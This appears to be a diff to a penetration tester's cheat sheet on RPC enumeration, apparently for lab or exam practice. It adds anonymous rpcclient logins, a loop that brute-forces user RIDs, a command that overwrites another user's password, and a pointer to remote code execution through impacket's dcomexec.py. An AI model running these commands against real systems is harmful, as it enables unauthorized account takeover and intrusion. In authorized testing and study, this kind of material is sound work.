@@ -4,6 +4,7 @@
 nmap -sV -p 111 --script=rpcinfo $ip
 nmap -sV -p 111 --script=rpc* $ip
 rpcdump.py $ip -p 135
+rpcclient -U '' -N $ip
 rpcclient -U "" $ip // when asked enter empty password
 rpcclient $ip -N -U "" \\$ip
 rpcclient $>srvinfo
@@ -97,7 +98,7 @@ netshareenum
 netshareenumall
 netsharegetinfo Confidential
 querydispinfo
-lsalookupprivvalue SeCreateTokenPrivielge
+lsalookupprivvalue SeImpersonatePrivielge
 
 #Run the below command
 for command in $(cat rpc-enum.txt); do rpcclient -U "%" -c $command $ip; done
@@ -108,6 +109,7 @@ OVERWRITE SOMEONE'S PASSWORD!!!
 ```bash
 rpcclient -N -U "hazel.green%haze1988" $ip
 setuserinfo2 MOLLY.SMITH 23 'Password123!'
+setuserinfo christopher.lewis 23 'Admin!23'
 ```
 
 Automate a bit.
@@ -118,6 +120,24 @@ for name in $(cat ../users.txt.bak); do rpcclient 192.168.165.40 -U "hazel.green
 ```
 
 ```bash
+for command in $(cat rpc-enum.txt); do rpcclient $ip -U "$user%$pass" -c $command; done
 for command in $(cat rpc-enum.txt); do rpcclient $ip -U "%" -c $command; done
 for name in $(cat ../users.txt.bak); do rpcclient $ip -U "%" -c "queryuser $name"; done
 ```
+
+#### Enumerate Users
+
+```bash
+    for i in $(seq 500 1100); do
+        rpcclient -N -U "" $ip -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";
+    done
+```
+
+#### RCE
+
+It is possible to execute remote code on a machine, if the credentials of a valid user are available using dcomexec.py from impacket framework.
+
+Remember to try with the different objects available
+    - ShellWindows
+    - ShellBrowserWindow
+    - MMC20
